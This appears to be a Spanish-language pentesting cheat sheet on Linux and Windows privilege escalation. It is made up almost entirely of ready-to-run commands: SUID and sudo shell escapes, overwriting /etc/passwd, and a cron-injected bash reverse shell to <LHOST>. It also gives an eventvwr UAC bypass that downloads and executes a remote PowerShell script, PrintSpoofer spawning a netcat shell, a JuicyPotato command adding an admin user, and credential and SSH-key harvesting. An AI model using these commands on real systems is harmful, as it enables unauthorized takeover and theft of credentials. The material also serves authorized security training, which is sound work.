<div align="center">

# 💥 Offensive Security
### Escalamiento de Privilegios — Linux & Windows

![Status](https://img.shields.io/badge/Status-Active-ff3c6e?style=for-the-badge&logo=statuspage&logoColor=white)
![Category](https://img.shields.io/badge/Category-Privilege%20Escalation-a855f7?style=for-the-badge&logo=hackthebox&logoColor=white)
![Platform](https://img.shields.io/badge/Platform-Linux%20%7C%20Windows-00d4ff?style=for-the-badge&logo=linux&logoColor=white)

</div>

---

> **Escalamiento de Privilegios:** técnica de pasar de un usuario de bajos privilegios a uno de altos (root/SYSTEM). El objetivo es obtener control total del sistema comprometido.

> [!WARNING]
> **Aviso Legal y Ético:** Uso exclusivo en entornos con **autorización explícita por escrito (RoE).** El uso no autorizado constituye un delito penal.

---

## 📑 Tabla de Contenidos

| # | Sección |
|---|---------|
| 01 | [🗂️ Herramientas de Enumeración Automática](#️-herramientas-de-enumeración-automática) |
| 02 | [🐧 Linux — Enumeración Manual](#-linux--enumeración-manual) |
| 03 | [🐧 Linux — Sudo & SUID](#-linux--sudo--suid) |
| 04 | [🐧 Linux — Cron Jobs](#-linux--cron-jobs) |
| 05 | [🐧 Linux — Capabilities & PATH](#-linux--capabilities--path) |
| 06 | [🐧 Linux — Credenciales & Archivos Sensibles](#-linux--credenciales--archivos-sensibles) |
| 07 | [🪟 Windows — Enumeración Manual](#-windows--enumeración-manual) |
| 08 | [🪟 Windows — UAC Bypass](#-windows--uac-bypass) |
| 09 | [🪟 Windows — Token Impersonation](#-windows--token-impersonation) |
| 10 | [🪟 Windows — Servicios & Registro](#-windows--servicios--registro) |
| 11 | [🪟 Windows — PowerSploit & WinPEAS](#-windows--powersploit--winpeas) |
| 12 | [📊 Recapitulación](#-recapitulación) |

---

## 🗂️ Herramientas de Enumeración Automática

| Herramienta | OS | Uso |
|-------------|-----|-----|
| **LinPEAS** | Linux | Enumeración completa automática |
| **WinPEAS** | Windows | Enumeración completa automática |
| **LinEnum** | Linux | Script bash de enumeración |
| **linux-smart-enum** | Linux | Enumeración enfocada en privesc |
| **PowerUp** | Windows | Checklist PowerShell de misconfigs |
| **BeRoot** | Win/Linux | Detección de vectores de escalada |
| **PEASS-ng** | Win/Linux | Suite PEAS actualizada |
| **GTFOBins** | Linux | Referencia de binarios para escalada |
| **LOLBAS** | Windows | Binarios nativos abusables |
| `local_exploit_suggester` | MSF | Sugiere exploits locales por sesión |

---

## 🐧 Linux — Enumeración Manual

![Tool](https://img.shields.io/badge/OS-Linux-ff3c6e?style=flat-square&logo=linux&logoColor=white)

### `[01]` Sistema e Identidad

```bash
id                                  # UID, GID, grupos del usuario actual
whoami                              # Usuario actual
hostname                            # Nombre del host
uname -a                            # Info del kernel
cat /etc/os-release                 # Distribución
cat /proc/version                   # Versión del kernel + compilador
env                                 # Variables de entorno
```

### `[02]` Usuarios & Grupos

```bash
cat /etc/passwd                     # Todos los usuarios
cat /etc/group                      # Todos los grupos
cat /etc/shadow                     # Hashes (requiere privilegios)
w                                   # Usuarios conectados
last                                # Últimos logins
lastlog                             # Login de cada usuario
```

### `[03]` Red

```bash
ip a                                # Interfaces de red
ss -tulnp                           # Puertos en escucha
netstat -tulnp                      # Alternativa a ss
ip route                            # Tabla de rutas
arp -a                              # Tabla ARP
cat /etc/hosts                      # Hosts locales
```

### `[04]` Procesos & Servicios

```bash
ps aux                              # Todos los procesos
ps aux | grep root                  # Procesos de root
top                                 # Procesos en tiempo real
systemctl list-units --type=service # Servicios activos
```

### `[05]` LinPEAS (automático)

```bash
# Descargar y ejecutar
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Transferir al objetivo
# En atacante:
python3 -m http.server 80
# En víctima:
wget http://<LHOST>/linpeas.sh -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh | tee /tmp/linpeas_out.txt
```

---

## 🐧 Linux — Sudo & SUID

### `[01]` Sudo

```bash
sudo -l                             # Ver comandos permitidos con sudo
sudo -u <usuario> <comando>         # Ejecutar como otro usuario
sudo su                             # Cambiar a root si permitido
```

**Ejemplo — sudo vi:**
```bash
sudo vi
# Dentro de vi:
:!/bin/bash                         # Shell como root
```

> [!TIP]
> Consultar **GTFOBins** (https://gtfobins.github.io) para cada binario encontrado en `sudo -l`.

### `[02]` Binarios SUID (SetUID)

```bash
# Buscar binarios SUID
find / -perm -u=s -type f 2>/dev/null
find / -perm -4000 -type f 2>/dev/null

# Buscar SGID
find / -perm -g=s -type f 2>/dev/null
```

**Ejemplos comunes:**

```bash
# find con SUID
find . -exec /bin/sh \; -quit

# bash con SUID
/bin/bash -p

# cp con SUID — sobrescribir /etc/passwd
openssl passwd -1 -salt hacker hacker123    # Generar hash
echo 'hacker:$1$hacker$hash...:0:0::/root:/bin/bash' >> /tmp/passwd
cp /tmp/passwd /etc/passwd
su hacker

# nmap con SUID (versiones antiguas)
nmap --interactive
nmap> !sh
```

---

## 🐧 Linux — Cron Jobs

```bash
# Ver crontabs
cat /etc/crontab
cat /etc/cron.d/*
cat /var/spool/cron/crontabs/*
ls -la /etc/cron*

# Monitorear procesos nuevos (detectar crons en ejecución)
watch -n 1 "ps aux | grep -v 'grep\|watch'"

# Herramienta pspy (sin privilegios)
./pspy64                            # Monitorear procesos en tiempo real
```

**Ataque — script escribible ejecutado por cron:**
```bash
# Si el cron ejecuta /opt/backup.sh y tenemos escritura:
echo 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1' >> /opt/backup.sh

# O agregar usuario root
echo 'echo "hacker::0:0::/root:/bin/bash" >> /etc/passwd' >> /opt/backup.sh
```

---

## 🐧 Linux — Capabilities & PATH

### Capabilities

```bash
# Buscar binarios con capabilities
getcap -r / 2>/dev/null

# Ejemplo peligroso — python con cap_setuid
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

### PATH Hijacking

```bash
# Verificar PATH
echo $PATH
env | grep PATH

# Si un script usa comandos sin ruta absoluta:
# Crear binario falso en directorio con escritura
echo '/bin/bash' > /tmp/curl
chmod +x /tmp/curl
export PATH=/tmp:$PATH
# Ejecutar el script vulnerable → usa nuestro "curl"
```

### Directorios Escribibles

```bash
find / -writable -type d 2>/dev/null
find / -writable -type f 2>/dev/null | grep -v proc
```

---

## 🐧 Linux — Credenciales & Archivos Sensibles

```bash
# Archivos de configuración con credenciales
find / -name "*.conf" 2>/dev/null | xargs grep -l "password" 2>/dev/null
find / -name "*.php" 2>/dev/null | xargs grep -l "password" 2>/dev/null
find / -name ".env" 2>/dev/null

# Historia de comandos
cat ~/.bash_history
cat ~/.zsh_history
cat /root/.bash_history

# SSH keys
find / -name "id_rsa" 2>/dev/null
find / -name "authorized_keys" 2>/dev/null
cat ~/.ssh/id_rsa

# Archivos con SUID de otros usuarios
find / -user root -perm -4000 2>/dev/null
```

---

## 🪟 Windows — Enumeración Manual

![Tool](https://img.shields.io/badge/OS-Windows-00d4ff?style=flat-square&logo=windows&logoColor=white)

### `[01]` Sistema e Identidad

```cmd
whoami                              # Usuario actual
whoami /priv                        # Privilegios del token
whoami /groups                      # Grupos del usuario
net user                            # Listar usuarios
net user <usuario>                  # Detalle de usuario
net localgroup administrators       # Miembros del grupo Admins
systeminfo                          # Info del sistema
hostname                            # Nombre del host
```

### `[02]` Procesos & Servicios

```cmd
tasklist                            # Procesos activos
tasklist /SVC                       # Procesos + servicios asociados
sc query                            # Servicios del sistema
sc qc <servicio>                    # Configuración de un servicio
net start                           # Servicios iniciados
wmic service list brief             # Lista de servicios via WMI
```

### `[03]` Red

```cmd
ipconfig /all                       # Interfaces de red
netstat -ano                        # Conexiones activas + PIDs
arp -a                              # Tabla ARP
route print                         # Tabla de rutas
net share                           # Recursos compartidos
```

### `[04]` Parches & Vulnerabilidades

```cmd
wmic qfe get Caption,Description,HotFixID,InstalledOn   # Parches instalados
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
```

---

## 🪟 Windows — UAC Bypass

> [!NOTE]
> UAC (User Account Control) bloquea ejecución privilegiada. Bypass necesario cuando usuario está en grupo Admins pero UAC activo.

### Via Metasploit

```bash
# Desde sesión meterpreter con usuario admin
use exploit/windows/local/bypassuac_eventvwr
set SESSION <id>
exploit

# Alternativa
use exploit/windows/local/bypassuac_fodhelper
set SESSION <id>
exploit

# Verificar tras bypass
getuid
getsystem
getsystem -t 1
```

### Via PowerShell (eventvwr)

```powershell
# Método eventvwr — escalar desde admin a SYSTEM
$cmd = "powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/shell.ps1')"
New-Item "HKCU:\Software\Classes\mscfile\shell\open\command" -Force
Set-ItemProperty "HKCU:\Software\Classes\mscfile\shell\open\command" -Name "(default)" -Value $cmd
Start-Process "eventvwr.exe"
```

---

## 🪟 Windows — Token Impersonation

> [!IMPORTANT]
> Si `whoami /priv` muestra `SeImpersonatePrivilege` → vulnerable a Potato attacks.

### Privileges Necesarios

```
SeImpersonatePrivilege    → JuicyPotato, PrintSpoofer, RoguePotato
SeAssignPrimaryToken      → JuicyPotato
SeDebugPrivilege          → Migrar a procesos SYSTEM
```

### PrintSpoofer (Windows 10 / Server 2019)

```cmd
PrintSpoofer.exe -i -c cmd
PrintSpoofer.exe -c "nc <LHOST> <LPORT> -e cmd"
```

### JuicyPotato (Windows Server 2016 / Win 10 < 1809)

```cmd
JuicyPotato.exe -l 1337 -p cmd.exe -t * -c {CLSID}
JuicyPotato.exe -l 1337 -p "c:\windows\system32\cmd.exe" -a "/c net user hacker Hacker123! /add" -t *
```

### Via Metasploit / Meterpreter

```bash
# Desde meterpreter
use incognito
list_tokens -u
impersonate_token "NT AUTHORITY\\SYSTEM"
getuid
```

---

## 🪟 Windows — Servicios & Registro

### Servicios con Permisos Débiles

```cmd
# Detectar servicios modificables
sc qc <servicio>
icacls "C:\ruta\al\servicio.exe"

# Reemplazar binario del servicio
copy malicious.exe "C:\ruta\al\servicio.exe"
sc stop <servicio>
sc start <servicio>
```

### Rutas de Servicios Sin Comillas (Unquoted Path)

```cmd
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\"
```

**Si el path es:** `C:\Program Files\My App\service.exe`
**Crear:** `C:\Program.exe` o `C:\Program Files\My.exe`

### Registro Vulnerable

```cmd
# Verificar permisos de claves del registro de servicios
reg query HKLM\SYSTEM\CurrentControlSet\Services\<servicio>
accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\<servicio>
```

---

## 🪟 Windows — PowerSploit & WinPEAS

### PowerUp (PowerSploit)

```powershell
# Desde meterpreter — subir y ejecutar
upload /root/PowerSploit/Privesc/PowerUp.ps1

# Desde shell de Windows
powershell -ExecutionPolicy Bypass -Command ". .\PowerUp.ps1; Invoke-AllChecks"

# Alternativa desde Import-Module
powershell -ExecutionPolicy Bypass
Import-Module C:\Users\user\Desktop\PowerUp.ps1
Invoke-AllChecks
```

### WinPEAS

```cmd
# Ejecutar WinPEAS directamente
winPEAS.exe

# Solo checks de servicios
winPEAS.exe servicesinfo

# Solo usuarios y credenciales
winPEAS.exe userinfo

# Output a archivo
winPEAS.exe > C:\Temp\winpeas_out.txt
```

### BeRoot

```bash
# Desde meterpreter
upload /ruta/beRoot.exe C:\Temp\beRoot.exe
shell
C:\Temp\beRoot.exe
```

### Metasploit — Local Exploit Suggester

```bash
# Desde sesión meterpreter activa
use post/multi/recon/local_exploit_suggester
set SESSION <id>
run
```

---

## 📊 Recapitulación

### Linux — Vectores Prioritarios

```
1. sudo -l          → binarios abusables (GTFOBins)
2. SUID/SGID        → find / -perm -4000
3. Cron jobs        → pspy64, /etc/crontab
4. Capabilities     → getcap -r /
5. PATH hijacking   → scripts sin rutas absolutas
6. Credenciales     → .bash_history, .env, configs
```

### Windows — Vectores Prioritarios

```
1. whoami /priv         → SeImpersonate → Potato
2. UAC bypass           → bypassuac_* (MSF)
3. Servicios débiles    → unquoted path, permisos
4. PowerUp              → Invoke-AllChecks
5. Parches faltantes    → local_exploit_suggester
6. Credenciales         → reg, configuraciones
```

| Herramienta | OS | Comando rápido |
|-------------|-----|----------------|
| LinPEAS | Linux | `./linpeas.sh` |
| WinPEAS | Windows | `winpeas.exe` |
| PowerUp | Windows | `Invoke-AllChecks` |
| GTFOBins | Linux | https://gtfobins.github.io |
| LOLBAS | Windows | https://lolbas-project.github.io |
| pspy | Linux | `./pspy64` |
| local_exploit_suggester | MSF | `post/multi/recon/local_exploit_suggester` |
